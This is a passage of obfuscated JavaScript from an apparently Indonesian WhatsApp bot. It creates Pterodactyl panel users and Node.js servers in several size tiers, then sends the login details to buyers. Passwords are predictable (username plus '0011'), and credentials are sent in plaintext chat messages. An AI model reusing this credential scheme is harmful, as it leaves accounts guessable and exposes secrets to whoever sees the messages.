          let _0x4e39b5 = _0x432e1b[_0x597c(488)] ? _0x432e1b[_0x597c(488)].sender : _0x3fe975[1] ? _0x3fe975[1][_0x597c(729)](/[^0-9]/g, '') + _0x597c(981) : _0x432e1b[_0x597c(836)][0];
          let _0x18ad5e = _0x1d67a5 + _0x597c(857);
          let _0x3569aa = global[_0x597c(886)];
          let _0x46a4e2 = global[_0x597c(544)];
          let _0x4c620c = _0x597c(833);
          let _0x392615 = _0x597c(752);
          let _0x561b8c = _0x597c(833);
          let _0x2fe1d9 = _0x1d67a5 + _0x597c(589);
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x4e39b5) {
            return;
          }
          let _0x30c4a8 = _0x1d67a5 + _0x597c(377);
          let _0x61a697 = await fetch(domain + _0x597c(722), {
            'method': "POST",
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON.stringify({
              'email': _0x2fe1d9,
              'username': _0x1d67a5,
              'first_name': _0x1d67a5,
              'last_name': _0x1d67a5,
              'language': 'en',
              'password': _0x30c4a8
            })
          });
          let _0x571edd = await _0x61a697[_0x597c(487)]();
          if (_0x571edd[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON.stringify(_0x571edd.errors[0], null, 2));
          }
          let _0x218898 = _0x571edd.attributes;
          let _0x5827f5 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x3569aa, {
            'method': _0x597c(674),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            }
          });
          const _0x48426e = {
            url: akunlo
          };
          _0x432e1b[_0x597c(395)]("SUCCES CREATE USER ID: " + _0x218898.id);
          ctf = _0x597c(854) + _0x4e39b5[_0x597c(613)]`@`[0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x218898[_0x597c(632)] + _0x597c(652) + _0x30c4a8 + _0x597c(782) + domain + _0x597c(985);
          _0x5051a5[_0x597c(937)](_0x4e39b5, {
            'image': _0x48426e,
            'caption': ctf
          }, {
            'quoted': _0x5051a5.chat
          });
          const _0x5a0a82 = {
            memory: _0x4c620c,
            swap: 0x0,
            disk: _0x561b8c,
            io: 0x1f4,
            cpu: _0x392615
          };
          const _0x38a281 = {
            databases: 0x5,
            backups: 0x5,
            allocations: 0x1
          };
          let _0x1b86d5 = await _0x5827f5[_0x597c(487)]();
          let _0xee4b1c = _0x1b86d5[_0x597c(740)][_0x597c(807)];
          let _0x1eab3d = await fetch(domain + _0x597c(474), {
            'method': "POST",
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON[_0x597c(554)]({
              'name': _0x18ad5e,
              'description': _0x597c(784),
              'user': _0x218898.id,
              'egg': parseInt(_0x3569aa),
              'docker_image': _0x597c(911),
              'startup': _0xee4b1c,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': _0x597c(396)
              },
              'limits': _0x5a0a82,
              'feature_limits': _0x38a281,
              'deploy': {
                'locations': [parseInt(_0x46a4e2)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x2fce42 = await _0x1eab3d.json();
          if (_0x2fce42[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON.stringify(_0x2fce42[_0x597c(915)][0], null, 2));
          }
        }
        break;
      case _0x597c(925):
        {
          if (!_0x403967 && !_0x18271c) {
            return _0x3652ad(mess[_0x597c(842)][_0x597c(456)]);
          }
          let _0x1ce675 = _0x4d0552[_0x597c(613)](',');
          if (_0x1ce675[_0x597c(625)] < 2) {
            return _0x432e1b[_0x597c(395)]("*Format salah!*\nPenggunaan:\n" + (_0x49f20b + _0x4af652) + " user,nomer");
          }
          let _0x40904c = _0x1ce675[0];
          let _0x168330 = _0x432e1b[_0x597c(488)] ? _0x432e1b[_0x597c(488)].sender : _0x1ce675[1] ? _0x1ce675[1][_0x597c(729)](/[^0-9]/g, '') + _0x597c(981) : _0x432e1b[_0x597c(836)][0];
          let _0x37a8e1 = _0x40904c + _0x597c(795);
          let _0x2bff41 = global[_0x597c(886)];
          let _0x1b135f = global.location;
          let _0x3dfbd4 = _0x597c(417);
          let _0x34ba76 = _0x597c(572);
          let _0xaf3e80 = _0x40904c + _0x597c(589);
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x168330) {
            return;
          }
          let _0x57d4e0 = _0x40904c + _0x597c(377);
          let _0x2f4907 = await fetch(domain + "/api/application/users", {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON[_0x597c(554)]({
              'email': _0xaf3e80,
              'username': _0x40904c,
              'first_name': _0x40904c,
              'last_name': _0x40904c,
              'language': 'en',
              'password': _0x57d4e0
            })
          });
          let _0x31f01f = await _0x2f4907[_0x597c(487)]();
          if (_0x31f01f[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x31f01f.errors[0], null, 2));
          }
          let _0x8bcade = _0x31f01f[_0x597c(740)];
          let _0x43faa4 = await fetch(domain + _0x597c(767) + _0x2bff41, {
            'method': _0x597c(674),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            }
          });
          const _0x63124e = {
            url: akunlo
          };
          _0x432e1b[_0x597c(395)]("SUCCES CREATE USER ID: " + _0x8bcade.id);
          ctf = _0x597c(854) + _0x168330[_0x597c(613)]`@`[0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x8bcade[_0x597c(632)] + _0x597c(652) + _0x57d4e0 + "\n⎙─➤ *🌐LOGIN* : " + domain + _0x597c(985);
          _0x5051a5.sendMessage(_0x168330, {
            'image': _0x63124e,
            'caption': ctf
          }, {
            'quoted': _0x5051a5[_0x597c(805)]
          });
          const _0x35ce68 = {
            memory: _0x3dfbd4,
            swap: 0x0,
            disk: '22240',
            io: 0x1f4,
            cpu: _0x34ba76
          };
          const _0x4213b0 = {
            databases: 0x5,
            backups: 0x5,
            allocations: 0x1
          };
          let _0x1da6e5 = await _0x43faa4.json();
          let _0x30de2b = _0x1da6e5.attributes[_0x597c(807)];
          let _0x43ac4a = await fetch(domain + _0x597c(474), {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON[_0x597c(554)]({
              'name': _0x37a8e1,
              'description': _0x597c(784),
              'user': _0x8bcade.id,
              'egg': parseInt(_0x2bff41),
              'docker_image': _0x597c(911),
              'startup': _0x30de2b,
              'environment': {
                'INST': _0x597c(521),
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': _0x597c(396)
              },
              'limits': _0x35ce68,
              'feature_limits': _0x4213b0,
              'deploy': {
                'locations': [parseInt(_0x1b135f)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x32789a = await _0x43ac4a[_0x597c(487)]();
          if (_0x32789a[_0x597c(915)]) {
            return _0x432e1b.rzxReply(JSON[_0x597c(554)](_0x32789a.errors[0], null, 2));
          }
        }
        break;
      case "21gb":
        {
          if (!_0x403967 && !_0x18271c) {
            return _0x3652ad(mess[_0x597c(842)][_0x597c(456)]);
          }
          let _0x444d73 = _0x4d0552[_0x597c(613)](',');
          if (_0x444d73.length < 2) {
            return _0x432e1b[_0x597c(395)]("*Format salah!*\nPenggunaan:\n" + (_0x49f20b + _0x4af652) + _0x597c(929));
          }
          let _0x2eb567 = _0x444d73[0];
          let _0x3b8029 = _0x432e1b[_0x597c(488)] ? _0x432e1b.quoted.sender : _0x444d73[1] ? _0x444d73[1][_0x597c(729)](/[^0-9]/g, '') + "@s.whatsapp.net" : _0x432e1b.mentionedJid[0];
          let _0x3c90bf = _0x2eb567 + "21GB";
          let _0x48276b = global[_0x597c(886)];
          let _0xa4529 = global[_0x597c(544)];
          let _0x519b3b = _0x597c(955);
          let _0x4c6553 = _0x597c(549);
          let _0x14902a = _0x597c(955);
          let _0x43a555 = _0x2eb567 + "1398@gmail.com";
          akunlo = _0x597c(916);
          if (!_0x3b8029) {
            return;
          }
          let _0x1cb6e5 = _0x2eb567 + "0011";
          let _0x56354d = await fetch(domain + "/api/application/users", {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x43a555,
              'username': _0x2eb567,
              'first_name': _0x2eb567,
              'last_name': _0x2eb567,
              'language': 'en',
              'password': _0x1cb6e5
            })
          });
          let _0x491e65 = await _0x56354d[_0x597c(487)]();
          if (_0x491e65.errors) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x491e65[_0x597c(915)][0], null, 2));
          }
          let _0x29fad9 = _0x491e65[_0x597c(740)];
          let _0x4df0d2 = await fetch(domain + _0x597c(767) + _0x48276b, {
            'method': _0x597c(674),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            }
          });
          const _0x188a01 = {
            url: akunlo
          };
          _0x432e1b.rzxReply(_0x597c(346) + _0x29fad9.id);
          ctf = _0x597c(854) + _0x3b8029[_0x597c(613)]`@`[0] + _0x597c(1006) + _0x29fad9.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x1cb6e5 + _0x597c(782) + domain + _0x597c(985);
          _0x5051a5[_0x597c(937)](_0x3b8029, {
            'image': _0x188a01,
            'caption': ctf
          }, {
            'quoted': _0x5051a5[_0x597c(805)]
          });
          const _0x532b08 = {
            memory: _0x519b3b,
            swap: 0x0,
            disk: _0x14902a,
            io: 0x1f4,
            cpu: _0x4c6553
          };
          const _0x524f8c = {
            databases: 0x5,
            backups: 0x5,
            allocations: 0x1
          };
          let _0x4bf03e = await _0x4df0d2[_0x597c(487)]();
          let _0x4e2fbb = _0x4bf03e.attributes[_0x597c(807)];
          let _0x10a58f = await fetch(domain + _0x597c(474), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': "application/json",
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON.stringify({
              'name': _0x3c90bf,
              'description': _0x597c(784),
              'user': _0x29fad9.id,
              'egg': parseInt(_0x48276b),
              'docker_image': _0x597c(911),
              'startup': _0x4e2fbb,
              'environment': {
                'INST': _0x597c(521),
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': _0x597c(396)
              },
              'limits': _0x532b08,
              'feature_limits': _0x524f8c,
              'deploy': {
                'locations': [parseInt(_0xa4529)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x3e9421 = await _0x10a58f.json();
          if (_0x3e9421[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x3e9421[_0x597c(915)][0], null, 2));
          }
        }
        break;
      case _0x597c(614):
        {
          if (!_0x403967 && !_0x18271c) {
            return _0x3652ad(mess.only[_0x597c(456)]);
          }
          let _0x4252a9 = _0x4d0552[_0x597c(613)](',');
          if (_0x4252a9[_0x597c(625)] < 2) {
            return _0x432e1b[_0x597c(395)](_0x597c(988) + (_0x49f20b + _0x4af652) + " user,nomer");
          }
          let _0x4ade97 = _0x4252a9[0];
          let _0x3987da = _0x432e1b[_0x597c(488)] ? _0x432e1b[_0x597c(488)][_0x597c(467)] : _0x4252a9[1] ? _0x4252a9[1].replace(/[^0-9]/g, '') + _0x597c(981) : _0x432e1b.mentionedJid[0];
          let _0x537224 = _0x4ade97 + _0x597c(626);
          let _0x4bd4a2 = global[_0x597c(886)];
          let _0x4aa4d6 = global[_0x597c(544)];
          let _0x2cc7ca = _0x597c(662);
          let _0x1e8f77 = _0x597c(552);
          let _0xdf2d5e = _0x4ade97 + _0x597c(589);
          akunlo = _0x597c(916);
          if (!_0x3987da) {
            return;
          }
          let _0x243368 = _0x4ade97 + '0011';
          let _0x35f719 = await fetch(domain + _0x597c(722), {
            'method': _0x597c(970),
            'headers': {
              'Accept': "application/json",
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON[_0x597c(554)]({
              'email': _0xdf2d5e,
              'username': _0x4ade97,
              'first_name': _0x4ade97,
              'last_name': _0x4ade97,
              'language': 'en',
              'password': _0x243368
            })
          });
          let _0x22c365 = await _0x35f719[_0x597c(487)]();
          if (_0x22c365[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x22c365[_0x597c(915)][0], null, 2));
          }
          let _0x1ff738 = _0x22c365[_0x597c(740)];
          let _0x43eace = await fetch(domain + "/api/application/nests/5/eggs/" + _0x4bd4a2, {
            'method': _0x597c(674),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            }
          });
          const _0x3c0a83 = {
            url: akunlo
          };
          _0x432e1b.rzxReply(_0x597c(346) + _0x1ff738.id);
          ctf = "Hai @" + _0x3987da[_0x597c(613)]`@`[0] + _0x597c(1006) + _0x1ff738.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x243368 + _0x597c(782) + domain + _0x597c(985);
          _0x5051a5[_0x597c(937)](_0x3987da, {
            'image': _0x3c0a83,
            'caption': ctf
          }, {
            'quoted': _0x5051a5.chat
          });
          const _0x998235 = {
            memory: _0x2cc7ca,
            swap: 0x0,
            disk: "20240",
            io: 0x1f4,
            cpu: _0x1e8f77
          };
          const _0x1b2142 = {
            databases: 0x5,
            backups: 0x5,
            allocations: 0x1
          };
          let _0x5de68d = await _0x43eace[_0x597c(487)]();
          let _0x2c26fe = _0x5de68d[_0x597c(740)][_0x597c(807)];
          let _0x79a1b8 = await fetch(domain + "/api/application/servers", {
            'method': _0x597c(970),
            'headers': {
              'Accept': "application/json",
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON[_0x597c(554)]({
              'name': _0x537224,
              'description': _0x597c(784),
              'user': _0x1ff738.id,
              'egg': parseInt(_0x4bd4a2),
              'docker_image': _0x597c(911),
              'startup': _0x2c26fe,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': _0x597c(396)
              },
              'limits': _0x998235,
              'feature_limits': _0x1b2142,
              'deploy': {
                'locations': [parseInt(_0x4aa4d6)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x575af3 = await _0x79a1b8.json();
          if (_0x575af3[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x575af3[_0x597c(915)][0], null, 2));
          }
        }
        break;
      case _0x597c(963):
        {
          if (!_0x403967 && !_0x18271c) {
            return _0x3652ad(mess[_0x597c(842)].premium);
          }
          let _0x1091ce = _0x4d0552[_0x597c(613)](',');
          if (_0x1091ce[_0x597c(625)] < 2) {
            return _0x432e1b[_0x597c(395)]("*Format salah!*\nPenggunaan:\n" + (_0x49f20b + _0x4af652) + _0x597c(929));
          }
          let _0x541944 = _0x1091ce[0];
          let _0x248591 = _0x432e1b.quoted ? _0x432e1b[_0x597c(488)][_0x597c(467)] : _0x1091ce[1] ? _0x1091ce[1].replace(/[^0-9]/g, '') + _0x597c(981) : _0x432e1b.mentionedJid[0];
          let _0xa3ca = _0x541944 + _0x597c(591);
          let _0x4371b8 = global.eggsnya;
          let _0x57cc4c = global[_0x597c(544)];
          let _0x57452f = _0x597c(687);
          let _0x259f1c = _0x597c(687);
          let _0x204666 = _0x541944 + "1398@gmail.com";
          akunlo = _0x597c(916);
          if (!_0x248591) {
            return;
          }
          let _0x4a14e3 = _0x541944 + "0011";
          let _0x451aa7 = await fetch(domain + _0x597c(722), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': "Bearer " + apikey
            },
            'body': JSON[_0x597c(554)]({
              'email': _0x204666,
              'username': _0x541944,
              'first_name': _0x541944,
              'last_name': _0x541944,
              'language': 'en',
              'password': _0x4a14e3
            })
          });
          let _0x25c60e = await _0x451aa7[_0x597c(487)]();
          if (_0x25c60e[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x25c60e[_0x597c(915)][0], null, 2));
          }
          let _0x297abc = _0x25c60e[_0x597c(740)];
          let _0x6ea53f = await fetch(domain + _0x597c(767) + _0x4371b8, {
            'method': _0x597c(674),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            }
          });
          const _0x42bb31 = {
            url: akunlo
          };
          _0x432e1b[_0x597c(395)](_0x597c(346) + _0x297abc.id);
          ctf = "Hai @" + _0x248591.split`@`[0] + _0x597c(1006) + _0x297abc[_0x597c(632)] + _0x597c(652) + _0x4a14e3 + _0x597c(782) + domain + _0x597c(985);
          _0x5051a5[_0x597c(937)](_0x248591, {
            'image': _0x42bb31,
            'caption': ctf
          }, {
            'quoted': _0x5051a5[_0x597c(805)]
          });
          const _0xbd1987 = {
            memory: _0x57452f,
            swap: 0x0,
            disk: _0x259f1c,
            io: 0x1f4,
            cpu: "500"
          };
          const _0x2c7d4f = {
            databases: 0x5,
            backups: 0x5,
            allocations: 0x1
          };
          let _0x4758ce = await _0x6ea53f[_0x597c(487)]();
          let _0x1aa9f0 = _0x4758ce[_0x597c(740)].startup;
          let _0x352529 = await fetch(domain + _0x597c(474), {
            'method': "POST",
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON.stringify({
              'name': _0xa3ca,
              'description': _0x597c(784),
              'user': _0x297abc.id,
              'egg': parseInt(_0x4371b8),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x1aa9f0,
              'environment': {
                'INST': _0x597c(521),
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': _0xbd1987,
              'feature_limits': _0x2c7d4f,
              'deploy': {
                'locations': [parseInt(_0x57cc4c)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x426a4a = await _0x352529[_0x597c(487)]();
          if (_0x426a4a.errors) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x426a4a[_0x597c(915)][0], null, 2));
          }
        }
        break;
      case "18gb":
        {
          if (!_0x403967 && !_0x18271c) {
            return _0x3652ad(mess.only[_0x597c(456)]);
          }
          let _0x149201 = _0x4d0552[_0x597c(613)](',');
          if (_0x149201[_0x597c(625)] < 2) {
            return _0x432e1b[_0x597c(395)]("*Format salah!*\nPenggunaan:\n" + (_0x49f20b + _0x4af652) + " user,nomer");
          }
          let _0x2ab096 = _0x149201[0];
          let _0x281c3d = _0x432e1b[_0x597c(488)] ? _0x432e1b[_0x597c(488)][_0x597c(467)] : _0x149201[1] ? _0x149201[1][_0x597c(729)](/[^0-9]/g, '') + _0x597c(981) : _0x432e1b[_0x597c(836)][0];
          let _0x40691f = _0x2ab096 + _0x597c(607);
          let _0x2eba4d = global[_0x597c(886)];
          let _0x2f6487 = global[_0x597c(544)];
          let _0x10d76d = _0x597c(764);
          let _0x14c879 = _0x597c(881);
          let _0x5369fc = _0x597c(764);
          let _0x5489ea = _0x2ab096 + _0x597c(589);
          akunlo = _0x597c(916);
          if (!_0x281c3d) {
            return;
          }
          let _0x576370 = _0x2ab096 + _0x597c(377);
          let _0x677ba1 = await fetch(domain + _0x597c(722), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON[_0x597c(554)]({
              'email': _0x5489ea,
              'username': _0x2ab096,
              'first_name': _0x2ab096,
              'last_name': _0x2ab096,
              'language': 'en',
              'password': _0x576370
            })
          });
          let _0x1f8ea6 = await _0x677ba1[_0x597c(487)]();
          if (_0x1f8ea6[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x1f8ea6[_0x597c(915)][0], null, 2));
          }
          let _0x56df6e = _0x1f8ea6[_0x597c(740)];
          let _0x1e1e60 = await fetch(domain + _0x597c(767) + _0x2eba4d, {
            'method': _0x597c(674),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': "Bearer " + apikey
            }
          });
          const _0x4263bb = {
            url: akunlo
          };
          _0x432e1b.rzxReply(_0x597c(346) + _0x56df6e.id);
          ctf = _0x597c(854) + _0x281c3d[_0x597c(613)]`@`[0] + _0x597c(1006) + _0x56df6e[_0x597c(632)] + _0x597c(652) + _0x576370 + "\n⎙─➤ *🌐LOGIN* : " + domain + _0x597c(985);
          _0x5051a5[_0x597c(937)](_0x281c3d, {
            'image': _0x4263bb,
            'caption': ctf
          }, {
            'quoted': _0x5051a5.chat
          });
          const _0x3498c3 = {
            memory: _0x10d76d,
            swap: 0x0,
            disk: _0x5369fc,
            io: 0x1f4,
            cpu: _0x14c879
          };
          const _0x3c54c6 = {
            databases: 0x5,
            backups: 0x5,
            allocations: 0x1
          };
          let _0x2cffb0 = await _0x1e1e60.json();
          let _0xed8152 = _0x2cffb0.attributes[_0x597c(807)];
          let _0x35e3eb = await fetch(domain + _0x597c(474), {
            'method': _0x597c(970),
            'headers': {
              'Accept': "application/json",
              'Content-Type': _0x597c(599),
              'Authorization': "Bearer " + apikey
            },
            'body': JSON[_0x597c(554)]({
              'name': _0x40691f,
              'description': _0x597c(784),
              'user': _0x56df6e.id,
              'egg': parseInt(_0x2eba4d),
              'docker_image': _0x597c(911),
              'startup': _0xed8152,
              'environment': {
                'INST': _0x597c(521),
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': _0x597c(396)
              },
              'limits': _0x3498c3,
              'feature_limits': _0x3c54c6,
              'deploy': {
                'locations': [parseInt(_0x2f6487)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x21980c = await _0x35e3eb[_0x597c(487)]();
          if (_0x21980c[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x21980c[_0x597c(915)][0], null, 2));
          }
        }
        break;
      case _0x597c(485):
        {
          if (!_0x403967 && !_0x18271c) {
            return _0x3652ad(mess.only[_0x597c(456)]);
          }
          let _0x4d7249 = _0x4d0552[_0x597c(613)](',');
          if (_0x4d7249[_0x597c(625)] < 2) {
            return _0x432e1b.rzxReply(_0x597c(988) + (_0x49f20b + _0x4af652) + _0x597c(929));
          }
          let _0x3557eb = _0x4d7249[0];
          let _0x37715c = _0x432e1b.quoted ? _0x432e1b.quoted[_0x597c(467)] : _0x4d7249[1] ? _0x4d7249[1][_0x597c(729)](/[^0-9]/g, '') + _0x597c(981) : _0x432e1b[_0x597c(836)][0];
          let _0x1e01d6 = _0x3557eb + _0x597c(462);
          let _0xf395d7 = global.eggsnya;
          let _0x24a0a0 = global.location;
          let _0x392d19 = _0x597c(900);
          let _0x5426ef = _0x597c(719);
          let _0x44169b = _0x597c(900);
          let _0x42bbc3 = _0x3557eb + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x37715c) {
            return;
          }
          let _0x482684 = _0x3557eb + _0x597c(377);
          let _0x52bcf9 = await fetch(domain + _0x597c(722), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON[_0x597c(554)]({
              'email': _0x42bbc3,
              'username': _0x3557eb,
              'first_name': _0x3557eb,
              'last_name': _0x3557eb,
              'language': 'en',
              'password': _0x482684
            })
          });
          let _0x263de4 = await _0x52bcf9[_0x597c(487)]();
          if (_0x263de4.errors) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x263de4.errors[0], null, 2));
          }
          let _0x509e8d = _0x263de4.attributes;
          let _0x42934f = await fetch(domain + _0x597c(767) + _0xf395d7, {
            'method': _0x597c(674),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': "application/json",
              'Authorization': _0x597c(792) + apikey
            }
          });
          const _0x4ac42d = {
            url: akunlo
          };
          _0x432e1b[_0x597c(395)](_0x597c(346) + _0x509e8d.id);
          ctf = _0x597c(854) + _0x37715c.split`@`[0] + _0x597c(1006) + _0x509e8d.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x482684 + "\n⎙─➤ *🌐LOGIN* : " + domain + _0x597c(985);
          _0x5051a5.sendMessage(_0x37715c, {
            'image': _0x4ac42d,
            'caption': ctf
          }, {
            'quoted': _0x5051a5.chat
          });
          const _0x3b58e8 = {
            memory: _0x392d19,
            swap: 0x0,
            disk: _0x44169b,
            io: 0x1f4,
            cpu: _0x5426ef
          };
          const _0x4c12b3 = {
            databases: 0x5,
            backups: 0x5,
            allocations: 0x1
          };
          let _0x5b95e8 = await _0x42934f.json();
          let _0x25ed9f = _0x5b95e8[_0x597c(740)][_0x597c(807)];
          let _0x484356 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON[_0x597c(554)]({
              'name': _0x1e01d6,
              'description': "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x509e8d.id,
              'egg': parseInt(_0xf395d7),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x25ed9f,
              'environment': {
                'INST': _0x597c(521),
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': _0x597c(396)
              },
              'limits': _0x3b58e8,
              'feature_limits': _0x4c12b3,
              'deploy': {
                'locations': [parseInt(_0x24a0a0)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x36b0ff = await _0x484356[_0x597c(487)]();
          if (_0x36b0ff.errors) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x36b0ff[_0x597c(915)][0], null, 2));
          }
        }
        break;
      case '10gb':
        {
          if (!_0x403967 && !_0x18271c) {
            return _0x3652ad(mess[_0x597c(842)][_0x597c(456)]);
          }
          let _0x2c0213 = _0x4d0552[_0x597c(613)](',');
          if (_0x2c0213.length < 2) {
            return _0x432e1b[_0x597c(395)](_0x597c(988) + (_0x49f20b + _0x4af652) + _0x597c(929));
          }
          let _0x489a40 = _0x2c0213[0];
          let _0x3f8c0b = _0x432e1b.quoted ? _0x432e1b[_0x597c(488)][_0x597c(467)] : _0x2c0213[1] ? _0x2c0213[1][_0x597c(729)](/[^0-9]/g, '') + _0x597c(981) : _0x432e1b.mentionedJid[0];
          let _0x4faa44 = _0x489a40 + _0x597c(592);
          let _0x39be0e = global.eggsnya;
          let _0x5a7a92 = global[_0x597c(544)];
          let _0x497684 = _0x597c(508);
          let _0x371e93 = _0x489a40 + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x3f8c0b) {
            return;
          }
          let _0x411289 = _0x489a40 + _0x597c(377);
          let _0x122205 = await fetch(domain + _0x597c(722), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x371e93,
              'username': _0x489a40,
              'first_name': _0x489a40,
              'last_name': _0x489a40,
              'language': 'en',
              'password': _0x411289
            })
          });
          let _0x1ae155 = await _0x122205[_0x597c(487)]();
          if (_0x1ae155.errors) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x1ae155[_0x597c(915)][0], null, 2));
          }
          let _0x4f7559 = _0x1ae155[_0x597c(740)];
          let _0x428353 = await fetch(domain + _0x597c(767) + _0x39be0e, {
            'method': _0x597c(674),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            }
          });
          const _0x5f02ff = {
            url: akunlo
          };
          _0x432e1b[_0x597c(395)](_0x597c(346) + _0x4f7559.id);
          ctf = _0x597c(854) + _0x3f8c0b[_0x597c(613)]`@`[0] + _0x597c(1006) + _0x4f7559.username + _0x597c(652) + _0x411289 + _0x597c(782) + domain + _0x597c(985);
          _0x5051a5[_0x597c(937)](_0x3f8c0b, {
            'image': _0x5f02ff,
            'caption': ctf
          }, {
            'quoted': _0x5051a5[_0x597c(805)]
          });
          const _0x22ce41 = {
            memory: "10240",
            swap: 0x0,
            disk: "10240",
            io: 0x1f4,
            cpu: _0x497684
          };
          const _0xdb551 = {
            databases: 0x5,
            backups: 0x5,
            allocations: 0x1
          };
          let _0x3bcafa = await _0x428353[_0x597c(487)]();
          let _0x3452ce = _0x3bcafa[_0x597c(740)][_0x597c(807)];
          let _0x15e590 = await fetch(domain + _0x597c(474), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON[_0x597c(554)]({
              'name': _0x4faa44,
              'description': _0x597c(784),
              'user': _0x4f7559.id,
              'egg': parseInt(_0x39be0e),
              'docker_image': _0x597c(911),
              'startup': _0x3452ce,
              'environment': {
                'INST': _0x597c(521),
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': _0x22ce41,
              'feature_limits': _0xdb551,
              'deploy': {
